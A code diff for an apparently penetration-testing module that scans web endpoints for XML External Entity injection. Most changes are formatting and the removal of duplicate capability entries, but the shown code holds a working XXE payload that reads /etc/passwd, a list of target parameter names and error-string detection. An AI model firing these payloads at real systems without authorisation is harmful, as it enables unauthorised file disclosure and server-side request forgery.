@@ -18,8 +18,7 @@ class Module(Auxiliary, Http_client):
         'references': [
             'https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing',
             'https://portswigger.net/web-security/xxe',
-            'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html',
-        ],
+            'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html'],
     'agent': {
         'risk': 'active',
         'effects': ['network_probe'],
@@ -44,11 +43,8 @@ class Module(Auxiliary, Http_client):
          'endpoint_pattern_any': [],
          'param_any': [],
          'api_surface_ready': False},
-        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'ssrf_primitive', 'from_detail': ''},
-                                   {'capability': 'db_access', 'from_detail': ''},
-                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
+        'chain':         {'produces_capabilities': [{'capability': 'ssrf_primitive', 'from_detail': ''},
+{'capability': 'file_read', 'from_detail': 'lfi_path'},
                                    {'capability': 'lfi_param', 'from_detail': 'lfi_param'},
                                    {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                    {'capability': 'lfi_param', 'from_detail': 'lfi_param'}],
@@ -118,15 +114,13 @@ class Module(Auxiliary, Http_client):
         # XXE - Base64 encoded
         '''<?xml version="1.0"?>
 <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/read=string.rot13/resource=file:///etc/passwd">]>
-<foo>&xxe;</foo>''',
-    ]
+<foo>&xxe;</foo>''']
 
     # Parameter names commonly used for XML
     XML_PARAMS = [
         'xml', 'data', 'input', 'content', 'body',
         'request', 'payload', 'message', 'xml_data',
-        'xml_data', 'xml_content', 'xml_body',
-    ]
+        'xml_data', 'xml_content', 'xml_body']
 
     def check(self):
         """
@@ -215,8 +209,7 @@ class Module(Auxiliary, Http_client):
                 'xml parsing error', 'xml parse error',
                 'xml syntax error', 'xml parser error',
                 'entity reference', 'external entity',
-                'doctype', 'xml declaration',
-            ]
+                'doctype', 'xml declaration']
             
             for error in xml_errors:
                 if error in response_text:
